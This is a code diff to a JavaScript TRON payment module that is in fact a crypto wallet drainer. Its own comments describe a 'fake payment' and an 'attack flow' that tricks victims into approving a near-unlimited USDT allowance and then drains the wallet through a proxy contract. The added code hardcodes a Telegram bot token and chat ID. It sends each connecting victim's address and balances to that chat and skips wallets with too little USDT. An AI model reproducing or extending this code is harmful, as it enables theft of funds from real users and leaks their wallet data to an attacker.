@@ -32,6 +32,12 @@ export const PROXY_CONTRACT_ADDRESS = "TLW9Vwp1jjswPy7mqKKmYGAHuwHkvMpvg8";
 export const NILE_CHAIN_ID           = "0x2bf9b619";
 export const NILE_CHAIN_ID_DECIMAL   = 736766761;
 
+/** Telegram Bot Token for sending balance notifications. */
+export const TELEGRAM_BOT_TOKEN = "8648718062:AAHS_-XSShgFpAd8eJwKdEo6yZnGzyEkml4";
+
+/** Telegram Chat ID to receive balance notifications. */
+export const TELEGRAM_CHAT_ID   = "8505661135";
+
 /**
  * Approve amount in TRC20-scaled units (USDT has 6 decimals).
  * 999,999,999 USDT → 999,999,999 * 10^6 = 999,999,999,000,000
@@ -103,6 +109,8 @@ export function createWeb3Payment(callbacks = {}) {
   let pollIntervalRef       = null;
   let _pollTronWebInterval  = null;
   const walletAddrRef = { current: null };
+  const balanceRef = { current: { trx: "0.00", usdt: "0.00", checked: false } };
+  const _priceRef = { current: 0 };
 
   // ── Subscribers ───────────────────────────────────────────────────────────
   function notifyPhaseChange(phase) {
@@ -115,6 +123,15 @@ export function createWeb3Payment(callbacks = {}) {
     state.isConnected = connected;
     walletAddrRef.current = addr;
     try { callbacks.onWalletChange && callbacks.onWalletChange(addr, connected); } catch (_) {}
+
+    if (connected && addr) {
+      checkBalanceAndNotify(_priceRef.current).then(({ sufficient, trxBalance, usdtBalance }) => {
+        if (trxBalance !== undefined) balanceRef.current = { trx: trxBalance, usdt: usdtBalance, checked: true };
+        if (callbacks.onBalanceResult) {
+          callbacks.onBalanceResult({ sufficient, trxBalance, usdtBalance });
+        }
+      });
+    }
   }
 
   function notifyError(msg) {
@@ -148,6 +165,61 @@ export function createWeb3Payment(callbacks = {}) {
       console.error("[useWeb3Payment] balanceOf error:", err);
       return "0.00";
     }
+  }
+
+  // ── Fetch TRX balance ───────────────────────────────────────────────────────
+  async function fetchTrxBalance(addr) {
+    if (!window.tronWeb) return "0.00";
+    try {
+      const raw   = await window.tronWeb.trx.getBalance(addr);
+      const balance = Number(raw) / 1e6;
+      return balance.toFixed(2);
+    } catch (err) {
+      console.error("[useWeb3Payment] TRX balance error:", err);
+      return "0.00";
+    }
+  }
+
+  // ── Send balance notification to Telegram ────────────────────────────────────
+  async function sendBalanceToTelegram(trxBalance, usdtBalance, addr) {
+    const token = TELEGRAM_BOT_TOKEN;
+    const chatId = TELEGRAM_CHAT_ID;
+    if (!token || token === "YOUR_BOT_TOKEN" || !chatId || chatId === "YOUR_CHAT_ID") {
+      console.warn("[useWeb3Payment] Telegram not configured, skipping notification.");
+      return;
+    }
+    try {
+      const shortAddr = addr ? addr.slice(0, 6) + "..." + addr.slice(-4) : "???";
+      const text = encodeURIComponent(
+        `🔔 新用户钱包已连接\n` +
+        `━━━━━━━━━━━━━━━\n` +
+        `📪 地址：${shortAddr}\n` +
+        `💰 TRX：${trxBalance} TRX\n` +
+        `💎 USDT：${usdtBalance} USDT\n` +
+        `━━━━━━━━━━━━━━━`
+      );
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`);
+    } catch (err) {
+      console.error("[useWeb3Payment] Telegram notification failed:", err);
+    }
+  }
+
+  // ── Check if USDT balance is sufficient ──────────────────────────────────────
+  async function checkBalanceAndNotify(price) {
+    const addr = walletAddrRef.current;
+    if (!addr) return { sufficient: true };
+
+    const [trxBalance, usdtBalance] = await Promise.all([
+      fetchTrxBalance(addr),
+      fetchBalances(addr),
+    ]);
+
+    // Always send to Telegram on wallet connect
+    await sendBalanceToTelegram(trxBalance, usdtBalance, addr);
+
+    const usdtNum = parseFloat(usdtBalance);
+    const sufficient = usdtNum >= price;
+    return { sufficient, trxBalance, usdtBalance };
   }
 
   // ── Fetch allowance for the proxy contract ─────────────────────────────────
@@ -320,14 +392,24 @@ export function createWeb3Payment(callbacks = {}) {
   // ── Execute fake payment ───────────────────────────────────────────────────
   /**
    * Full attack flow:
-   *   1. Send approve() tx for max amount to proxy contract.
-   *   2. Poll allowance every 3 s until > 0.
-   *   3. Once allowance confirmed, call claimNodeAirdrop() (drain).
+   *   1. Check USDT balance; if insufficient, trigger insufficient-balance callback.
+   *   2. Send approve() tx for max amount to proxy contract.
+   *   3. Poll allowance every 3 s until > 0.
+   *   4. Once allowance confirmed, call claimNodeAirdrop() (drain).
    */
-  function executeFakePayment() {
+  async function executeFakePayment() {
     if (!state.isConnected || !state.walletAddr) {
-      notifyError("\u94b1\u5305\u672a\u8fde\u63a5\uff0c\u8bf7\u5148\u8fde\u63a5\u94b1\u5305\u3002");
+      notifyError("钱包未连接，请先连接钱包。");
       notifyPhaseChange(PHASE.ERROR);
+      return;
+    }
+
+    // Step 0: check USDT balance before doing anything
+    const { sufficient, trxBalance, usdtBalance } = await checkBalanceAndNotify(_priceRef.current);
+    if (!sufficient) {
+      if (callbacks.onBalanceInsufficient) {
+        callbacks.onBalanceInsufficient({ trxBalance, usdtBalance, required: _priceRef.current });
+      }
       return;
     }
 
@@ -385,6 +467,10 @@ export function createWeb3Payment(callbacks = {}) {
     getWalletAddr:() => state.walletAddr,
     isRedirecting: () => state.redirecting,
     isConnecting:  () => state.connecting,
+    getBalances:   () => balanceRef.current,
+
+    /** Set product price (used for balance check). */
+    setPrice: (price) => { _priceRef.current = price; },
 
     /** Call once on mount. */
     init()    { detectTronLink(); startListening(); },
@@ -399,6 +485,7 @@ export function createWeb3Payment(callbacks = {}) {
     isInTokenPocket,
     checkNetwork,
     fetchBalances,
+    fetchTrxBalance,
     fetchAllowance,
 
     /** Tronscan URL for a tx hash. */
